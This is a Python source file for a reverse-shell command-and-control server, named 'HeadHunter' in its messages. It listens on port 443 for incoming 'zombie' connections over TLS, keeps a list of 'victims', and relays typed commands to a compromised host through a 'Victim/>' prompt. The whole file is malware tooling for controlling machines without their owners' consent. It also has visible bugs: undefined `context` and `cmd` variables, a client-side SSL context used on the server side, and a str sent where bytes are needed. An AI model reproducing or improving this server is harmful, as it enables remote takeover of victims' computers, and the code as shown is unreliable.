import socket
import ssl
import sys
import threading
import time

from dataclasses import dataclass


@dataclass(frozen=True)
class Victim:
    c: int
    addr: tuple[str, int]


class Server:
    def __init__(self, ip: str = '', port: int = 443):
        self.victims: list[Victim] = []
        self.socket: socket = None
        self.port = port
        self.activefd: int = 0
        self.activeaddr: str = ""
        
        context = ssl.create_default_context()
        context.load_default_certs()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
            sock.bind((ip, port))
            sock.listen(5)
            self._listen(sock, context)

    def _acceptor(self, sock) -> None:
        # Continuously accept incoming zombie connections
        while True:
            c, addr = sock.accept()
            
            ssock = context.wrap_socket(c, server_side=True)
            ssock.send("BRUHGER\n")  # TODO Check if needs to removed

            victim = Victim(c=ssock, addr=addr)
            self.victims.append(
                victim
            )
            print("\nGot connection from " + str(victim.addr) + " starting session. Type any command or press enter to return to previous session\n")

    def _listen(self, sock, context) -> None:
        # Initial master socket configuration, socket list allocation, and initial client connection handshake 
        print("Listening on port " + str(self.port) + " for connections...")
        
        c, addr = sock.accept()
        ssock = context.wrap_socket(c, server_side=True)
        print(ssock.version())
        victim = Victim(c=ssock, addr=addr)

        print("Got connection from " + str(victim.addr) + ". Starting reverse shell session. Type \"exit\" to return to the HeadHunter interactive shell\n")
        self.victims.append(victim)

        acceptorThread = threading.Thread(target=self._acceptor, args=(sock,), daemon=True)
        acceptorThread.start()

        self._control(ssock)

    def _control(self, ssock: int) -> None:
        # Control session for selected victims

        try:
            while True:	
                d = input("Victim/> ")

                if d == "exit":
                    break
                d += "\n"

                ssock.send(d.encode())
                data: str = ssock.recv(15024)

                print(cmd)
                
        except Exception as e:
            print("Error: " + str(e))
